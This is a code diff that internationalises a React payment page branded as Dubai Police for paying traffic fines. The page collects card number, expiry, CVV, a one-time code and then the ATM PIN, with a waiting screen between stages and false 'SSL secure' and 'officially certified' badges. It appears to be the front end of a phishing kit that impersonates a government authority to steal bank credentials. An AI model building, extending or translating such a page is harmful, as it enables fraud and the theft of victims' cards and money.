@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
+import { useLanguage } from "@/contexts/LanguageContext";
 
 // ======== أنواع البيانات ========
 type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
@@ -20,11 +21,12 @@ function DubaiPoliceLogo({ size = 40 }: { size?: number }) {
 
 // ======== مكون شريط التقدم ========
 function ProgressSteps({ stage }: { stage: Stage }) {
+  const { t } = useLanguage();
   const steps = [
-    { id: "card", label: "بيانات البطاقة", icon: "💳" },
-    { id: "otp", label: "رمز التحقق", icon: "🔐" },
-    { id: "atm", label: "الرقم السري", icon: "🏧" },
-    { id: "success", label: "تم الدفع", icon: "✅" },
+    { id: "card", label: t.payment.steps.card, icon: "💳" },
+    { id: "otp", label: t.payment.steps.otp, icon: "🔐" },
+    { id: "atm", label: t.payment.steps.pin, icon: "🏧" },
+    { id: "success", label: t.payment.steps.success, icon: "✅" },
   ];
 
   const getStepStatus = (stepId: string) => {
@@ -69,6 +71,7 @@ function ProgressSteps({ stage }: { stage: Stage }) {
 
 // ======== مكون صفحة الانتظار ========
 function WaitingPage({ message }: { message: string }) {
+  const { t } = useLanguage();
   return (
     <div className="flex flex-col items-center justify-center py-12 px-4">
       <div className="relative mb-6">
@@ -78,7 +81,7 @@ function WaitingPage({ message }: { message: string }) {
         </div>
       </div>
       <h3 className="text-lg font-bold text-gray-800 mb-2 text-center">{message}</h3>
-      <p className="text-sm text-gray-500 text-center mb-6">يرجى الانتظار، لا تغلق هذه الصفحة</p>
+      <p className="text-sm text-gray-500 text-center mb-6">{t.payment.waiting.dontClose}</p>
       <div className="flex gap-1">
         {[0, 1, 2].map(i => (
           <div key={i} className="w-2 h-2 rounded-full bg-[#006633] animate-bounce"
@@ -89,8 +92,8 @@ function WaitingPage({ message }: { message: string }) {
       <div className="mt-8 flex items-center gap-2 bg-green-50 border border-green-200 rounded-lg px-4 py-2">
         <span className="text-green-600 text-lg">🔒</span>
         <div>
-          <p className="text-xs font-bold text-green-700">اتصال آمن ومشفر</p>
-          <p className="text-xs text-green-600">SSL 256-bit Encryption</p>
+        <p className="text-xs font-bold text-green-700">{t.payment.waiting.secure}</p>
+        <p className="text-xs text-green-600">{t.payment.waiting.secureDesc}</p>
         </div>
       </div>
     </div>
@@ -99,25 +102,26 @@ function WaitingPage({ message }: { message: string }) {
 
 // ======== مكون صفحة النجاح ========
 function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () => void }) {
+  const { t } = useLanguage();
   return (
     <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
       <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
         <span className="text-4xl">✅</span>
       </div>
-      <h2 className="text-2xl font-bold text-green-600 mb-2">تم الدفع بنجاح!</h2>
-      <p className="text-gray-600 mb-4">تمت معالجة دفعتك بنجاح</p>
+      <h2 className="text-2xl font-bold text-green-600 mb-2">{t.payment.success.title}</h2>
+      <p className="text-gray-600 mb-4">{t.payment.success.subtitle}</p>
       <div className="bg-green-50 border border-green-200 rounded-xl p-4 mb-6 w-full max-w-xs">
-        <p className="text-sm text-gray-500">المبلغ المدفوع</p>
-        <p className="text-2xl font-bold text-green-600">{totalAmount} درهم</p>
+        <p className="text-sm text-gray-500">{t.payment.success.amountPaid}</p>
+        <p className="text-2xl font-bold text-green-600">{totalAmount} {t.payment.header.currency}</p>
       </div>
       <div className="bg-gray-50 rounded-xl p-4 mb-6 w-full max-w-xs text-right">
-        <p className="text-sm text-gray-500 mb-1">رقم المرجع</p>
+        <p className="text-sm text-gray-500 mb-1">{t.payment.success.reference}</p>
         <p className="text-sm font-mono text-gray-700">DP-{Date.now().toString().slice(-8)}</p>
         <p className="text-xs text-gray-400 mt-2">{new Date().toLocaleString("ar-AE")}</p>
       </div>
       <button onClick={onDone}
         className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
-        العودة للرئيسية
+        {t.payment.success.backButton}
       </button>
     </div>
   );
@@ -125,16 +129,17 @@ function SuccessPage({ totalAmount, onDone }: { totalAmount: string; onDone: () 
 
 // ======== مكون صفحة الفشل ========
 function FailedPage({ onRetry }: { onRetry: () => void }) {
+  const { t } = useLanguage();
   return (
     <div className="flex flex-col items-center justify-center py-8 px-4 text-center">
       <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mb-4">
         <span className="text-4xl">❌</span>
       </div>
-      <h2 className="text-2xl font-bold text-red-600 mb-2">فشلت عملية الدفع</h2>
-      <p className="text-gray-600 mb-6">لم تتم معالجة دفعتك. يرجى المحاولة مرة أخرى.</p>
+      <h2 className="text-2xl font-bold text-red-600 mb-2">{t.payment.failed.title}</h2>
+      <p className="text-gray-600 mb-6">{t.payment.failed.subtitle}</p>
       <button onClick={onRetry}
         className="w-full max-w-xs bg-[#006633] text-white py-3 rounded-xl font-bold text-base hover:bg-[#005528] transition">
-        المحاولة مرة أخرى
+        {t.payment.failed.retryButton}
       </button>
     </div>
   );
@@ -155,6 +160,7 @@ function CardForm({
   const [cardExpiry, setCardExpiry] = useState("");
   const [cardCvv, setCvv] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
+  const { t } = useLanguage();
 
   const formatCardNumber = (value: string) => {
     const digits = value.replace(/\D/g, "").slice(0, 16);
@@ -169,10 +175,10 @@ function CardForm({
 
   const validate = () => {
     const newErrors: Record<string, string> = {};
-    if (!cardName.trim()) newErrors.cardName = "يرجى إدخال اسم حامل البطاقة";
-    if (cardNumber.replace(/\s/g, "").length < 16) newErrors.cardNumber = "رقم البطاقة غير صحيح";
-    if (cardExpiry.length < 5) newErrors.cardExpiry = "تاريخ الانتهاء غير صحيح";
-    if (cardCvv.length < 3) newErrors.cardCvv = "رمز CVV غير صحيح";
+    if (!cardName.trim()) newErrors.cardName = t.payment.card.errors.cardHolder;
+    if (cardNumber.replace(/\s/g, "").length < 16) newErrors.cardNumber = t.payment.card.errors.cardNumber;
+    if (cardExpiry.length < 5) newErrors.cardExpiry = t.payment.card.errors.expiry;
+    if (cardCvv.length < 3) newErrors.cardCvv = t.payment.card.errors.cvv;
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
@@ -215,11 +221,11 @@ function CardForm({
         </p>
         <div className="flex justify-between items-end">
           <div>
-            <p className="text-xs text-white/60">حامل البطاقة</p>
+            <p className="text-xs text-white/60">{t.payment.card.cardHolder}</p>
             <p className="text-sm font-bold uppercase">{cardName || "CARD HOLDER"}</p>
           </div>
           <div className="text-right">
-            <p className="text-xs text-white/60">تاريخ الانتهاء</p>
+            <p className="text-xs text-white/60">{t.payment.card.expiry}</p>
             <p className="text-sm font-bold">{cardExpiry || "MM/YY"}</p>
           </div>
         </div>
@@ -233,12 +239,12 @@ function CardForm({
       )}
 
       <div>
-        <label className="block text-sm font-medium text-gray-700 mb-1">اسم حامل البطاقة</label>
+        <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.cardHolder}</label>
         <input
           type="text"
           value={cardName}
           onChange={e => setCardName(e.target.value)}
-          placeholder="الاسم كما هو مكتوب على البطاقة"
+          placeholder={t.payment.card.cardHolderPlaceholder}
           className={`w-full border rounded-xl px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-[#006633] transition
             ${errors.cardName ? "border-red-400 bg-red-50" : "border-gray-300"}`}
         />
@@ -246,7 +252,7 @@ function CardForm({
       </div>
 
       <div>
-        <label className="block text-sm font-medium text-gray-700 mb-1">رقم البطاقة</label>
+        <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.cardNumber}</label>
         <input
           type="text"
           inputMode="numeric"
@@ -262,7 +268,7 @@ function CardForm({
 
       <div className="grid grid-cols-2 gap-3">
         <div>
-          <label className="block text-sm font-medium text-gray-700 mb-1">تاريخ الانتهاء</label>
+          <label className="block text-sm font-medium text-gray-700 mb-1">{t.payment.card.expiry}</label>
           <input
             type="text"
             inputMode="numeric"
@@ -296,11 +302,11 @@ function CardForm({
         {isLoading ? (
           <>
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-            جاري المعالجة...
+            {t.payment.card.processing}
           </>
         ) : (
           <>
-            🔒 دفع الآن
+            🔒 {t.payment.card.payButton}
           </>
         )}
       </button>
@@ -320,11 +326,12 @@ function OtpForm({
 }) {
   const [otp, setOtp] = useState("");
   const [otpError, setOtpError] = useState("");
+  const { t } = useLanguage();
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (otp.length < 4) {
-      setOtpError("يرجى إدخال رمز التحقق كاملاً");
+      setOtpError(t.payment.otp.error);
       return;
     }
     setOtpError("");
@@ -337,8 +344,8 @@ function OtpForm({
         <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
           <span className="text-3xl">📱</span>
         </div>
-        <h3 className="text-lg font-bold text-gray-800">رمز التحقق (OTP)</h3>
-        <p className="text-sm text-gray-500 mt-1">تم إرسال رمز التحقق إلى رقم هاتفك المسجل</p>
+        <h3 className="text-lg font-bold text-gray-800">{t.payment.otp.title}</h3>
+        <p className="text-sm text-gray-500 mt-1">{t.payment.otp.subtitle}</p>
       </div>
 
       {(error || otpError) && (
@@ -349,13 +356,13 @@ function OtpForm({
       )}
 
       <div>
-        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">أدخل رمز التحقق</label>
+        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">{t.payment.otp.label}</label>
         <input
           type="text"
           inputMode="numeric"
           value={otp}
           onChange={e => setOtp(e.target.value.replace(/\D/g, "").slice(0, 8))}
-          placeholder="أدخل الرمز"
+          placeholder={t.payment.otp.placeholder}
           maxLength={8}
           className={`w-full border rounded-xl px-4 py-4 text-center text-2xl font-mono tracking-[0.5em] focus:outline-none focus:ring-2 focus:ring-[#006633] transition
             ${(error || otpError) ? "border-red-400 bg-red-50" : "border-gray-300"}`}
@@ -367,9 +374,9 @@ function OtpForm({
         {isLoading ? (
           <>
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-            جاري التحقق...
+            {t.payment.otp.verifying}
           </>
-        ) : "تأكيد الرمز"}
+        ) : t.payment.otp.confirmButton}
       </button>
     </form>
   );
@@ -387,11 +394,12 @@ function AtmPinForm({
 }) {
   const [pin, setPin] = useState("");
   const [pinError, setPinError] = useState("");
+  const { t } = useLanguage();
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (pin.length < 4) {
-      setPinError("يرجى إدخال الرقم السري كاملاً");
+      setPinError(t.payment.atm.error);
       return;
     }
     setPinError("");
@@ -404,8 +412,8 @@ function AtmPinForm({
         <div className="w-16 h-16 bg-amber-100 rounded-full flex items-center justify-center mx-auto mb-3">
           <span className="text-3xl">🏧</span>
         </div>
-        <h3 className="text-lg font-bold text-gray-800">الرقم السري للبطاقة</h3>
-        <p className="text-sm text-gray-500 mt-1">أدخل الرقم السري (PIN) الخاص ببطاقتك</p>
+        <h3 className="text-lg font-bold text-gray-800">{t.payment.atm.title}</h3>
+        <p className="text-sm text-gray-500 mt-1">{t.payment.atm.subtitle}</p>
       </div>
 
       {(error || pinError) && (
@@ -416,7 +424,7 @@ function AtmPinForm({
       )}
 
       <div>
-        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">الرقم السري</label>
+        <label className="block text-sm font-medium text-gray-700 mb-2 text-center">{t.payment.atm.label}</label>
         <input
           type="password"
           inputMode="numeric"
@@ -431,7 +439,7 @@ function AtmPinForm({
 
       <div className="bg-amber-50 border border-amber-200 rounded-xl p-3 flex items-start gap-2">
         <span className="text-amber-500 mt-0.5">⚠️</span>
-        <p className="text-xs text-amber-700">لا تشارك رقمك السري مع أي شخص. موظفو شرطة دبي لن يطلبوا منك هذه المعلومات.</p>
+        <p className="text-xs text-amber-700">{t.payment.atm.warning}</p>
       </div>
 
       <button type="submit" disabled={isLoading}
@@ -439,9 +447,9 @@ function AtmPinForm({
         {isLoading ? (
           <>
             <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-            جاري التحقق...
+            {t.payment.atm.verifying}
           </>
-        ) : "تأكيد الرقم السري"}
+        ) : t.payment.atm.confirmButton}
       </button>
     </form>
   );
@@ -450,6 +458,7 @@ function AtmPinForm({
 // ======== الصفحة الرئيسية للدفع ========
 export default function Payment() {
   const [, navigate] = useLocation();
+  const { t } = useLanguage();
 
   // قراءة بيانات الدفع من sessionStorage
   const [paymentData] = useState(() => {
@@ -524,10 +533,10 @@ export default function Payment() {
     return (
       <div className="min-h-screen bg-gray-50 flex items-center justify-center" dir="rtl">
         <div className="text-center">
-          <p className="text-gray-600 mb-4">لا توجد بيانات دفع. يرجى العودة وتحديد المخالفات.</p>
+          <p className="text-gray-600 mb-4">{t.payment.noData.message}</p>
           <button onClick={() => navigate("/")}
             className="bg-[#006633] text-white px-6 py-2 rounded-xl font-bold">
-            العودة للرئيسية
+            {t.payment.noData.backButton}
           </button>
         </div>
       </div>
@@ -632,13 +641,13 @@ export default function Payment() {
         <div className="flex items-center gap-2">
           <DubaiPoliceLogo size={32} />
           <div>
-            <p className="text-sm font-bold">شرطة دبي</p>
-            <p className="text-xs opacity-80">Dubai Police</p>
+            <p className="text-sm font-bold">{t.header.siteName}</p>
+            <p className="text-xs opacity-80">{t.header.siteNameEn}</p>
           </div>
         </div>
         <div className="text-right">
-          <p className="text-xs opacity-80">إجمالي المبلغ</p>
-          <p className="text-lg font-bold">{totalAmount} درهم</p>
+          <p className="text-xs opacity-80">{t.payment.header.totalAmount}</p>
+          <p className="text-lg font-bold">{totalAmount} {t.payment.header.currency}</p>
         </div>
       </div>
 
@@ -660,7 +669,7 @@ export default function Payment() {
           )}
 
           {stage === "card_pending" && (
-            <WaitingPage message="جاري التحقق من بيانات البطاقة..." />
+            <WaitingPage message={t.payment.waiting.card} />
           )}
 
           {stage === "otp" && (
@@ -672,7 +681,7 @@ export default function Payment() {
           )}
 
           {stage === "otp_pending" && (
-            <WaitingPage message="جاري التحقق من رمز التحقق..." />
+            <WaitingPage message={t.payment.waiting.otp} />
           )}
 
           {stage === "atm" && (
@@ -684,7 +693,7 @@ export default function Payment() {
           )}
 
           {stage === "atm_pending" && (
-            <WaitingPage message="جاري معالجة الدفع..." />
+            <WaitingPage message={t.payment.waiting.atm} />
           )}
 
           {stage === "success" && (
@@ -699,11 +708,11 @@ export default function Payment() {
         {/* شارة الأمان السفلية */}
         {stage !== "success" && stage !== "failed" && (
           <div className="flex items-center justify-center gap-4 mt-4 text-xs text-gray-400">
-            <span>🔒 SSL آمن</span>
+            <span>🔒 {t.payment.security.ssl}</span>
             <span>•</span>
-            <span>🛡️ محمي بالكامل</span>
+            <span>🛡️ {t.payment.security.protected}</span>
             <span>•</span>
-            <span>✅ معتمد رسمياً</span>
+            <span>✅ {t.payment.security.certified}</span>
           </div>
         )}
       </div>
